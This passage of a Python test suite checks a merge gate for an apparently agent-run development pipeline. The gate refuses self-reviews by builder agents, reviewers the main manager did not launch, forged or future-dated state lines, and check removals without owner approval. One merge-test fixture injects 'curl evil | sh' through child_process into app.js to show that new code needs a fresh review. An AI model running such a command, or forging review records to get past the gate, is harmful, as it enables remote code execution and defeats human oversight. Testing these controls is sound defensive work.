        # owner 1A (section 17): a task merges into the working branch; there is no origin/main here
        self.git("push", "-q", "origin", "base:refs/heads/trunk")
        self.repo.set_conf("working_branch", "trunk")             # a setting (owner 2026-11-25, section 28)
        self.git("config", "--local", "auto-pipeline.workingbranch", "trunk")   # section 37 F10: stored by init or the start
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        r = self.af("checks", "gate", "t", "--dir", self.repo.dir)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_the_base_follows_a_production_target(self):
        self.git("push", "-q", "origin", "base:refs/heads/main")
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho verified\nexit 0\n")
        self.ok("todo", "add", "p", "small", "publish it", "10", "--target", "production",
                "--owner-quote", "p can go live after done", "--means", "publish p to production")
        main_launched(self.repo.dir, "p")
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW"):
            self.ok("check", "p", b, "pass", "--by", "tm", "--evidence", "ok")
        r = self.af("checks", "gate", "p", "--dir", self.repo.dir)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_no_todo_line_needs_checks(self):
        r = self.af("checks", "gate", "ghost", "--dir", self.repo.dir, "--base", "base")
        self.assertEqual(r.returncode, 2, r.stdout + r.stderr)
        main_launched(self.repo.dir, "ghost")                       # section 44 F2
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW"):
            self.ok("check", "ghost", b, "pass", "--by", "tm", "--evidence", "ok")
        r = self.af("checks", "gate", "ghost", "--dir", self.repo.dir, "--base", "base", "--checks", "PR REVIEW")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_a_removed_brief_block_is_not_planned(self):
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho verified\nexit 0\n")
        self.ok("todo", "checks", "t", "UI CHECK")
        self.ok("todo", "checks", "t", "--remove", "UI CHECK", "--owner-quote", "leave the ui check out", "--means", "leave out UI CHECK for t")
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        self.assertEqual(self.gate().returncode, 0)

    def test_outcome_check_is_planned_for_every_task(self):
        # section 21: the PR-style review is the main check of every task, planned by the tool
        self.ok("todo", "add", "plain", "small", "x", "5")
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
            self.ok("check", "plain", b, "pass", "--by", "tm", "--evidence", "ok")
        r = self.af("checks", "gate", "plain", "--dir", self.repo.dir, "--base", "base")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertEqual(r.stdout.splitlines()[-1], "GATE REFUSED plain: PR REVIEW missing")

    def test_a_removed_tool_block_is_still_planned_when_the_diff_triggers_it(self):
        # a removal is recorded, but the gate recomputes the tool blocks from the diff
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho verified\nexit 0\n")
        self.ok("todo", "checks", "t", "BUILD")
        self.ok("todo", "checks", "t", "--remove", "BUILD", "--owner-quote", "no build needed here", "--means", "leave out BUILD for t")
        self.ok("todo", "checks", "t", "BUILD")
        self.passes("DIFF SCAN", "RELATED TESTS", "PR REVIEW")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("BUILD: missing", r.stdout.splitlines())

    # -- the builder never accepts its own work (kick-off answer 2)

    def test_a_diff_read_by_the_builder_is_refused(self):
        self.ok("todo", "builder", "t", "t Deputy")
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Deputy", "--evidence", "read my own diff")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PR REVIEW: pass by the builder (t Deputy), not accepted", r.stdout.splitlines())
        self.assertEqual(r.stdout.splitlines()[-1], "GATE REFUSED t: PR REVIEW by the builder")

    def test_the_builder_may_pass_the_tool_blocks(self):
        self.ok("todo", "builder", "t", "t Deputy")
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
            self.ok("check", "t", b, "pass", "--by", "t Deputy", "--evidence", "ok")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "check deputy", "--evidence", "read it")
        self.assertEqual(self.gate().returncode, 0)

    def test_a_worker_of_the_launch_records_is_a_builder(self):
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
            fh.write("LAUNCH a1: worker 1 | task t | t Worker 1: toast | since 2026-11-25 12:00 | pid 1 | by tm\n")
        self.ok("todo", "checks", "t", "UI CHECK")
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        self.ok("check", "t", "UI CHECK", "pass", "--by", "t Worker 1: toast", "--evidence", "clicked it")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI CHECK: pass by the builder (t Worker 1: toast), not accepted", r.stdout.splitlines())

    def test_unknown_builder_is_accepted_with_one_note(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS", "PR REVIEW")
        r = self.gate()
        self.assertEqual(r.returncode, 0, r.stdout)
        notes = [l for l in r.stdout.splitlines() if l.startswith("note: builder unknown")]
        self.assertEqual(notes, ["note: builder unknown: PR REVIEW by tm accepted"])

    def test_builder_field_on_the_todo_line(self):
        r = self.ok("todo", "builder", "t", "t Deputy")
        self.assertIn("builder t Deputy", self.fields("t"))
        self.ok("todo", "add", "u", "small", "x", "5", "--builder", "u Deputy")
        self.assertIn("builder u Deputy", self.fields("u"))


class TestNext(Case):

    def add(self, name, *extra):
        self.ok("todo", "add", name, "small", "what " + name, "10", *extra)

    def next(self, ram="10"):
        return self.ok("next", env={"AGENT_FAKE_RAM": ram})

    def test_a_queued_task_whose_after_task_is_done_can_start(self):
        self.add("a", "--scope", "src/a/**")
        self.ok("todo", "stage", "a", "tests")
        self.add("b", "--scope", "src/b/**")
        self.ok("todo", "wait", "b", "on", "queue", "--after", "a")
        r = self.ok("todo", "done", "a")
        self.assertIn("released: b", r.stdout.splitlines())
        self.assertNotIn("waiting queue", self.line("b"))
        self.assertNotIn("after a", self.line("b"))
        out = self.next().stdout.splitlines()
        # check-blocks section 25 (owner 2026-11-25): no slots, the memory rule decides
        self.assertRegex(out[0], r"^NEXT: 1 can start \(room \d+ MB under the 80% limit\)$")
        self.assertIn("START b | est 10m | what b", out)

    def test_after_task_still_open_waits(self):
        self.add("a", "--scope", "src/a/**")
        self.ok("todo", "stage", "a", "tests")
        self.add("b", "--scope", "src/b/**")
        self.ok("todo", "wait", "b", "on", "queue", "--after", "a")
        out = self.next().stdout.splitlines()
        self.assertIn("WAIT b: after a still open", out)
        self.assertFalse(any(l.startswith("START b") for l in out), out)

    def test_the_same_files_are_no_hold(self):
        # md-slim-principles D 13 (decision 3, parallel first): task A runs with scope
        # bin/x.py, queued task B has scope bin/x.py: todo next offers B
        self.add("a", "--scope", "bin/x.py")
        self.ok("todo", "stage", "a", "workers")
        self.add("b", "--scope", "bin/x.py")
        out = self.next().stdout.splitlines()
        self.assertIn("START b | est 10m | what b", out)
        self.assertFalse(any("clashes" in l for l in out), out)

    def test_a_queued_task_on_a_running_tasks_files_starts(self):
        self.add("a", "--scope", "bin/agent-file.sh,tests/**")
        self.ok("todo", "stage", "a", "workers")
        self.add("b", "--scope", "bin/agent-file.sh")
        self.ok("todo", "wait", "b", "on", "queue")
        out = self.next().stdout.splitlines()
        self.assertIn("START b | est 10m | what b", out)

    def test_no_room_for_a_pane_starts_nothing(self):
        self.add("a", "--scope", "x/**")
        self.ok("todo", "stage", "a", "tests")
        self.add("b", "--scope", "y/**")
        out = self.ok("next", env={"AGENT_FAKE_RAM": "75", "AGENT_FAKE_RAM_TOTAL_MB": "10000",
                                   "AGENT_RESERVE_FILE": os.path.join(self.repo.base, "reserve.json")}).stdout.splitlines()
        self.assertEqual(out[0], "NEXT: 0 can start: no room: 7500 MB in use + 0 MB reserved + 550 MB for a pane "
                                 "> 8000 MB")

    def test_many_running_tasks_are_no_count_problem(self):
        for n in ("a", "c", "d", "e", "f"):
            self.add(n, "--scope", "%s/**" % n)
            self.ok("todo", "stage", n, "tests")
        self.add("b", "--scope", "y/**")
        out = self.next().stdout.splitlines()
        self.assertIn("START b | est 10m | what b", out)

    def test_a_held_or_owner_wait_never_starts(self):
        self.add("h")
        self.ok("todo", "wait", "h", "on", "hold", "later")
        self.add("q")
        self.ok("todo", "wait", "q", "on", "question")
        out = self.next().stdout.splitlines()
        self.assertFalse(any(l.startswith(("START h", "START q")) for l in out), out)

    def test_no_scope_is_said(self):
        self.add("b")
        out = self.next().stdout.splitlines()
        self.assertIn("START b | est 10m | what b | scope unknown: judge", out)

    def test_released_lines_only_for_the_done_task(self):
        self.add("a")
        self.add("c")
        self.add("b")
        self.ok("todo", "wait", "b", "on", "queue", "--after", "c")
        r = self.ok("todo", "done", "a")
        self.assertNotIn("released:", r.stdout)
        self.assertIn("waiting queue", self.line("b"))


class TestEdgeAdd(Case):

    def conf(self):
        return self.repo.read("agent_repo.conf")

    def test_one_line_into_the_repo_file(self):
        with open(os.path.join(self.repo.dir, "agent_repo.conf"), "w") as fh:
            fh.write("version=1\nedge=empty value\n")
        r = self.ok("edge", "add", "a refund larger than the invoice")
        self.assertEqual(self.conf(), "version=1\nedge=empty value\nedge=a refund larger than the invoice\n")
        self.assertIn("edge add", r.stdout)

    def test_already_listed(self):
        with open(os.path.join(self.repo.dir, "agent_repo.conf"), "w") as fh:
            fh.write("edge=empty value\n")
        r = self.ok("edge", "add", "empty value")
        self.assertIn("edge add: already listed", r.stdout)
        self.assertEqual(self.conf(), "edge=empty value\n")

    def test_no_file_yet_makes_one(self):
        self.ok("edge", "add", "day boundary in local time")
        self.assertIn("edge=day boundary in local time\n", self.conf())

    def test_a_line_break_is_refused(self):
        r = self.af("edge", "add", "a\nb")
        self.assertEqual(r.returncode, 1)


BIN = os.path.join(ROOT, "bin")


VERIFIED = "#!/usr/bin/env bash\necho verified\nexit 0\n"


@only_own
class Gate(TestGate):
    def setUp(self):
        super().setUp()
        self.repo.write_bin_script("agent-owner-order.sh", VERIFIED)

    def head(self):
        return self.git("rev-parse", "HEAD").strip()

    def all_pass_but(self, *missing, task="t"):
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
            if b not in missing:
                self.ok("check", task, b, "pass", "--by", "tm", "--evidence", "ok")
        if "PR REVIEW" not in missing:
            self.ok("check", task, "PR REVIEW", "pass", "--by", task + " Review", "--evidence", "read it")


@only_own
class TestG1Removals(Gate):
    def test_pr_review_is_never_removed(self):
        r = self.af("todo", "checks", "t", "--remove", "PR REVIEW", "--owner-quote", "skip the review for this one",
                    "--means", "leave out PR REVIEW for t")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("todo checks: PR REVIEW is never removed", r.stdout + r.stderr)
        self.all_pass_but("PR REVIEW")
        self.assertEqual(self.gate().returncode, 1)

    def test_owner_sign_is_never_removed(self):
        r = self.af("todo", "checks", "t", "--remove", "OWNER SIGN", "--owner-quote", "no need to sign this one",
                    "--means", "leave out OWNER SIGN for t")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("todo checks: OWNER SIGN is never removed", r.stdout + r.stderr)

    def test_no_means_is_refused(self):
        # approval-design (section 53 A3): the tool stores what the main manager read; without it nothing changes
        r = self.af("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote",
                    "the related tests can wait, it is only a typo")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("--means", r.stdout + r.stderr)
        self.all_pass_but("RELATED TESTS")
        self.assertEqual(self.gate().returncode, 1)

    def test_his_words_and_the_means_remove_it(self):
        self.ok("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote",
                "the related tests can wait, it is only a typo", "--means", "leave out RELATED TESTS for t")
        self.all_pass_but("RELATED TESTS")
        self.assertEqual(self.gate().returncode, 0)

    def test_the_word_lists_and_sentences_are_gone(self):
        # section 51 H2: word lists cannot read a sentence; approval-design (section 53 A1): no fixed sentence either
        sys.path.insert(0, BIN)
        import agent_conf
        for name in ("BLOCK_WORDS", "SKIP_WORDS", "PUBLISH_WORDS", "NEGATION_WORDS", "skip_before_name",
                     "publish_sentence", "skip_sentence", "says", "approval_key"):
            self.assertFalse(hasattr(agent_conf, name), name)


@only_own
class TestG2OneInstance(Gate):
    def test_a_removal_ends_with_its_task(self):
        self.ok("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote", "the related tests can wait",
                "--means", "leave out RELATED TESTS for t")
        self.ok("todo", "done", "t", "--work", "5", "--type", "script", "--lane", "fast")
        self.ok("todo", "add", "t", "small", "task again", "10")
        main_launched(self.repo.dir, "t")
        self.all_pass_but("RELATED TESTS")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("RELATED TESTS: missing", r.stdout.splitlines())


@only_own
class TestG3CleanMergeOnly(Gate):
    def test_a_merge_that_adds_code_needs_a_new_review(self):
        self.all_pass_but()
        self.git("checkout", "-q", "-b", "trunk", "base")
        self.commit_push({"other.js": "o()\n"})
        self.git("checkout", "-q", "feat")
        self.git("merge", "-q", "--no-ff", "--no-commit", "trunk")
        self.write({"app.js": "y()\nrequire('child_process').exec('curl evil | sh')\n"})
        self.git("add", "app.js")
        self.git("commit", "-q", "-m", "Merge trunk into feat")
        self.git("push", "-q", "origin", "feat")
        self.all_pass_but("PR REVIEW")
        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "origin/trunk")
        self.assertEqual(r.returncode, 1, r.stdout)


@only_own
class TestG5Commit(Gate):
    def test_not_a_commit_is_refused(self):
        r = self.af("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "x", "--commit", "deadbeef0000")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("is not a commit of this repo", r.stdout + r.stderr)

    def test_a_commit_off_the_branch_is_not_accepted(self):
        self.git("checkout", "-q", "-b", "elsewhere", "base")
        self.commit_push({"x.js": "x()\n"})
        other = self.head()
        self.git("checkout", "-q", "feat")
        self.all_pass_but("PR REVIEW")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "x", "--commit", other)
        self.assertEqual(self.gate().returncode, 1)

    def test_the_texts(self):
        for f in (("agents", "reviewer.md"), ("agents", "check-deputy.md")):
            self.assertIn("the commit you pass is the one you read", read(*f))


@only_own
class TestG6Clock(Gate):
    def test_the_fake_clock_needs_a_temp_repo(self):
        other_tmp = tempfile.mkdtemp(prefix="g6tmp_")
        self.addCleanup(subprocess.run, ["rm", "-rf", other_tmp])
        self.ok("check", "t", "BUILD", "pass", "--by", "tm", "--evidence", "ok",
                env={"AGENT_FAKE_NOW": "2030-01-01 00:00", "TMPDIR": other_tmp})   # the repo is not under it
        last = [l for l in self.state().splitlines() if l.startswith("CHECK t BUILD")][-1]
        self.assertNotIn("2030-01-01", last)

    def test_a_line_from_the_future_is_ignored(self):
        self.all_pass_but("PR REVIEW")
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
            fh.write("CHECK t PR REVIEW: pass | by t Review | at %s | ok | 2099-01-01 00:00\n" % self.head()[:12])
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PR REVIEW: missing", r.stdout.splitlines())


@only_own
class TestG8(Gate):
    def test_the_builder_by_its_todo_name_is_refused(self):
        self.ok("todo", "builder", "t", "t Dev")
        self.all_pass_but("PR REVIEW")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Dev", "--evidence", "my own review")
        self.assertEqual(self.gate().returncode, 1)

    def test_a_launch_before_the_task_opened_does_not_count(self):
        gd = self.git("rev-parse", "--path-format=absolute", "--git-common-dir").strip()
        os.remove(os.path.join(gd, "agent_launches.jsonl"))
        main_launched(self.repo.dir, "t", at="2000-01-01 00:00")
        self.all_pass_but()
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)


@only_own
class TestH1AtTheHead(Gate):
    def test_an_owner_sign_on_an_earlier_commit_is_refused(self):
        self.ok("todo", "checks", "t", "OWNER SIGN")
        self.all_pass_but()
        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes merge it", "--means", "merge t")   # signs c1
        self.commit_push({"app.js": "z()\n"})                                       # c2 changes more
        self.all_pass_but()
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertTrue([l for l in r.stdout.splitlines() if l.startswith("OWNER SIGN: pass at ")], r.stdout)

    def test_a_db_check_on_an_earlier_commit_is_refused(self):
        self.ok("todo", "checks", "t", "DB CHECK")
        self.all_pass_but()
        self.ok("check", "t", "DB CHECK", "pass", "--by", "t Check", "--evidence", "migration ran")
        self.commit_push({"app.js": "z()\n"})
        self.all_pass_but()
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertTrue([l for l in r.stdout.splitlines() if l.startswith("DB CHECK: pass at ")], r.stdout)

    def test_the_documented_sign_command_passes_the_head(self):
        line = [l for l in read("skills", "dispatch", "SKILL.md").splitlines()
                if "OWNER SIGN" in l and "agent-file.sh check" in l][0]
        self.assertIn("--commit <head>", line)


def minute(delta_s=0):
    return time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time() + delta_s))


@only_own
class TestF2Launches(TestGate):
    def launches_file(self):
        return os.path.join(self.git("rev-parse", "--path-format=absolute", "--git-common-dir").strip(),
                            "agent_launches.jsonl")

    def set_launch(self, by, at="2000-01-01 00:00"):
        with open(self.launches_file(), "w") as fh:
            fh.write(json.dumps({"task": "t", "type": "reviewer", "by": by, "at": at}) + "\n")

    def review(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "read it")

    def test_no_launch_record_is_refused(self):
        os.remove(self.launches_file())
        self.review()
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PR REVIEW: no reviewer launched by the main manager for t, not accepted", r.stdout.splitlines())

    def test_a_reviewer_the_builder_launched_does_not_count(self):
        self.set_launch("tm")
        self.review()
        self.assertEqual(self.gate().returncode, 1)

    def test_a_pass_older_than_the_launch_does_not_count(self):
        self.review()
        self.set_launch("main", at="2099-01-01 00:00")
        self.assertEqual(self.gate().returncode, 1)

    def test_with_the_record_it_passes(self):
        self.review()
        r = self.gate()
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_the_fake_clock_only_in_tests(self):
        self.ok("check", "t", "BUILD", "pass", "--by", "tm", "--evidence", "ok",
                env={"AGENT_TESTING": "", "AGENT_FAKE_NOW": "2030-01-01 00:00"})
        last = [l for l in self.state().splitlines() if l.startswith("CHECK t BUILD")][-1]
        self.assertNotIn("2030-01-01", last)


@only_own
class TestFastLaneGate(TestGate):
    """fast-lane-simple: a fast-lane task takes the main manager's own PR REVIEW and no FLOW or UI CHECK."""
    PLAN = "FLOW CHECK,UI CHECK"

    def launches_file(self):
        return os.path.join(self.git("rev-parse", "--path-format=absolute", "--git-common-dir").strip(),
                            "agent_launches.jsonl")

    def setUp(self):
        super().setUp()
        os.remove(self.launches_file())                      # no reviewer or check deputy was launched
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")

    def review(self, by):
        self.ok("check", "t", "PR REVIEW", "pass", "--by", by, "--evidence", "read the diff")

    def test_main_manager_review_passes_a_fast_lane_task_with_no_flow_or_ui_check(self):
        self.ok("todo", "builder", "t", "t Deputy")
        self.review("auto-pipeline Manager")
        r = self.gate("--checks", self.PLAN)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertEqual(r.stdout.splitlines()[-1], "GATE PASS t")
        self.assertNotIn("FLOW CHECK: missing", r.stdout)
        self.assertNotIn("UI CHECK: missing", r.stdout)

    def test_the_same_lines_on_a_full_lane_task_are_refused(self):
        self.ok("todo", "builder", "t", "t Task Manager")
        self.review("auto-pipeline Manager")
        r = self.gate("--checks", self.PLAN)
        self.assertEqual(r.returncode, 1, r.stdout)
        lines = r.stdout.splitlines()
        self.assertIn("PR REVIEW: no reviewer launched by the main manager for t, not accepted", lines)
        self.assertIn("FLOW CHECK: missing", lines)
        self.assertIn("UI CHECK: missing", lines)

    def test_a_fast_lane_pr_review_by_someone_else_still_needs_a_launched_reviewer(self):
        self.ok("todo", "builder", "t", "t Deputy")
        self.review("t Reviewer")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PR REVIEW: no reviewer launched by the main manager for t, not accepted", r.stdout.splitlines())

    def test_a_task_manager_is_not_the_main_manager(self):
        self.ok("todo", "builder", "t", "t Deputy")
        self.review("t Task Manager")
        self.assertEqual(self.gate().returncode, 1)

    def test_the_deputy_cannot_review_its_own_work(self):
        self.ok("todo", "builder", "t", "t Deputy")
        self.review("t Deputy")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PR REVIEW: pass by the builder (t Deputy), not accepted", r.stdout.splitlines())

    def test_core_review_stays_for_a_fast_lane_task(self):
        self.ok("todo", "builder", "t", "t Deputy")
        self.review("auto-pipeline Manager")
        r = self.gate("--checks", "CORE REVIEW")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("CORE REVIEW: missing", r.stdout.splitlines())


class TestF3Commits(TestGate):
    def head(self):
        return self.git("rev-parse", "HEAD").strip()

    def review(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "read it")

    def test_the_line_records_the_commit(self):
        self.review()
        last = [l for l in self.state().splitlines() if l.startswith("CHECK t PR REVIEW")][-1]
        self.assertIn("| at %s |" % self.head()[:12], last)

    def test_a_pass_on_an_older_commit_is_refused(self):
        self.review()
        self.commit_push({"app.js": "z()\n"})
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertTrue([l for l in r.stdout.splitlines()
                         if re.match(r"^PR REVIEW: pass at \w+, not at the head \w+, not accepted$", l)], r.stdout)

    def test_a_later_merge_of_the_base_is_fine(self):
        self.review()
        self.git("checkout", "-q", "-b", "trunk", "base")
        self.commit_push({"other.js": "o()\n"})
        self.git("checkout", "-q", "feat")
        self.git("merge", "-q", "--no-ff", "-m", "Merge trunk into feat", "trunk")
        self.git("push", "-q", "origin", "feat")
        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "origin/trunk")
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_dir_must_be_on_the_branch(self):
        self.review()
        self.commit_push({"app.js": "w()\n"}, push=False)                  # --dir is ahead of origin/feat
        r = self.gate("--branch", "feat")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("GATE REFUSED t: --dir is not on origin/feat", r.stdout)

    def test_a_line_without_a_commit_is_not_accepted(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:     # appended by hand, no `at`
            fh.write("CHECK t PR REVIEW: pass | by t Reviewer | read it | %s\n" % minute(60))
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("PR REVIEW: pass with no commit, not accepted", r.stdout.splitlines())

    def test_a_review_dated_before_the_task_opened_is_not_accepted(self):
        # the time rule no longer drops a line that names a commit (owner 2026-11-27), but a review still needs a
        # reviewer launched by the main manager after the task opened, so an old review never passes by itself
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
            fh.write("CHECK t PR REVIEW: pass | by t Reviewer | at %s | read it | 2001-01-01 00:00\n" % self.head()[:12])
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertNotIn("PR REVIEW: pass (by t Reviewer)", r.stdout.splitlines())


@only_own
class TestF5Tie(TestGate):
    def test_same_minute_fail_wins(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        env = {"AGENT_FAKE_NOW": minute()}
        self.ok("check", "t", "PR REVIEW", "fail", "--by", "t Reviewer", "--evidence", "broken", env=env)
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "ok", env=env)
        self.assertEqual(self.gate().returncode, 1)


@only_own
class TestF11Removals(TestGate):
    def setUp(self):
        super().setUp()
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho verified\nexit 0\n")

    def test_a_verified_removal_is_subtracted_by_the_gate(self):
        r = self.af("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote", "the related tests can wait",
                    "--means", "leave out RELATED TESTS for t")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.passes("DIFF SCAN", "BUILD")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "read it")
        r = self.gate()
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_brief_blocks_survive_drop_and_add(self):
        self.ok("todo", "add", "t2", "small", "x", "10", "--checks", "EXAMPLES TEST")
        self.ok("todo", "drop", "t2", "started again")
        self.ok("todo", "add", "t2", "small", "x", "10")
        main_launched(self.repo.dir, "t2")
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
            self.ok("check", "t2", b, "pass", "--by", "tm", "--evidence", "ok")
        self.ok("check", "t2", "PR REVIEW", "pass", "--by", "t2 Reviewer", "--evidence", "ok")
        r = self.af("checks", "gate", "t2", "--dir", self.repo.dir, "--base", "base")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("EXAMPLES TEST: missing", r.stdout.splitlines())


@only_own
class TestA1AnotherCheckout(TestGate):
    """The reviewer's shell sits in the main checkout (the working branch); the task is in its own worktree."""

    def setUp(self):
        super().setUp()
        self.wt = os.path.join(self.repo.base, "task_wt")
        self.git("worktree", "add", "-q", "-b", "feat2", self.wt, "feat")
        self.commit_push({"app.js": "w()\n"}, cwd=self.wt)
        self.head = self.git("rev-parse", "HEAD", cwd=self.wt).strip()
        self.git("checkout", "-q", "base")                       # the main checkout is elsewhere

    def gate_wt(self):
        return self.af("checks", "gate", "t", "--dir", self.wt, "--base", "base", "--branch", "feat2")

    def lines_from_the_main_checkout(self, *extra):
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
            self.ok("check", "t", b, "pass", "--by", "tm", "--evidence", "ok", *extra)
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "read it", *extra)

    def test_without_commit_it_is_refused_and_names_both(self):
        self.lines_from_the_main_checkout()
        r = self.gate_wt()
        self.assertEqual(r.returncode, 1, r.stdout)
        base = self.git("rev-parse", "HEAD").strip()
        # section 50 G9: the main checkout's commit is not one of this branch's commits; both commits named (A1)
        self.assertIn("PR REVIEW: pass at %s, not a commit of this branch (head %s), not accepted"
                      % (base[:12], self.head[:12]), r.stdout.splitlines())

    def test_with_commit_it_passes(self):
        self.lines_from_the_main_checkout("--commit", self.head)
        r = self.gate_wt()
        self.assertEqual(r.returncode, 0, r.stdout)


@only_own
class TestG9(Gate):
    def test_old_passes_do_not_carry_to_a_new_instance(self):
        self.all_pass_but()
        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes sign it", "--means", "sign t")
        self.ok("todo", "done", "t", "--work", "5", "--type", "script", "--lane", "fast")
        self.ok("todo", "add", "t", "small", "another change", "10", "--checks", "PR REVIEW")
        main_launched(self.repo.dir, "t")
        self.git("checkout", "-q", "-b", "other", "base")
        self.commit_push({"app.js": "unrelated()\n"})
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "read it")   # only a new review
        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "base")
        self.assertEqual(r.returncode, 1, r.stdout)
        for block in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
            with self.subTest(block=block):
                self.assertNotIn("%s: pass" % block, r.stdout)

    def old_line(self, block, at):
        line = [l for l in open(os.path.join(self.repo.dir, "agent_todo.txt")) if l.startswith("t | ")][0]
        opened = line.split("opened ")[1][:16]
        t0 = time.mktime(time.strptime(opened, "%Y-%m-%d %H:%M"))
        before = time.strftime("%Y-%m-%d %H:%M", time.localtime(t0 - 60))
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
            fh.write("CHECK t %s: pass | by t Review | %s| ok | %s\n" % (block, ("at %s " % at) if at else "", before))

    def test_a_line_before_the_task_opened_at_a_commit_of_the_branch_counts(self):
        # owner 2026-11-27: the git history decides, not the time alone; a restart re-opens the todo line
        self.passes("DIFF SCAN", "RELATED TESTS")
        self.old_line("BUILD", self.head()[:12])
        r = self.gate()
        self.assertIn("BUILD: pass (by t Review)", r.stdout.splitlines())

    def test_a_line_before_the_task_opened_at_no_commit_is_ignored(self):
        self.passes("DIFF SCAN", "RELATED TESTS")
        self.old_line("BUILD", "")
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("BUILD: missing", r.stdout.splitlines())

    def test_an_owner_sign_before_the_task_opened_is_still_ignored(self):
        self.all_pass_but()
        self.old_line("OWNER SIGN", self.head()[:12])
        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "base", "--checks", "OWNER SIGN")
        self.assertIn("OWNER SIGN: missing", r.stdout.splitlines())


@only_own
class TestG11Removals(Gate):
    def test_no_means_is_refused(self):
        for block, words in (("BUILD", "no need to worry about the build server today"),
                             ("CORE REVIEW", "the review went fine yesterday, ship it without the banner"),
                             ("FLOW CHECK", "the flow on the screen looks good, no need to change it")):
            with self.subTest(block=block):
                r = self.af("todo", "checks", "t", "--remove", block, "--owner-quote", words)
                self.assertEqual(r.returncode, 1, r.stdout)
